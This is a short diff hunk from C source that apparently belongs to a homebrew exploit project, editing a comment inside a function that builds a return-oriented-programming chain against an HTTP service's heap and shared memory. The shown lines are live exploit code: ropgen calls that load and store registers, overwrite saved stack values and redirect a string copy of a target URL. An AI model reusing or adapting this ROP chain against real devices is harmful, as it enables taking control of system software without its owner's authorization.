@@ -1099,7 +1099,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x20, 1);
 	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncpy with the above new_url ptr.
 
-	ropgen_strncpy(&ropchain, &ropvaddr, 0, 0, 0xff);//strncpy(createcontext_inputurl, targeturl_list[targetindex].new_url, 0xff);
+	ropgen_strncpy(&ropchain, &ropvaddr, 0, 0, 0xff);//strncpy(createcontext_inputurl, curent->new_url, 0xff);
 
 	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x0, ropvaddr + 0x20 + 0x40 + 0x4, 0x3);//Overwrite the r4 value which gets popped below, with the saved cmdbuf ptr from above.
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x4, 1);//Restore r0 to the _this value copied above.
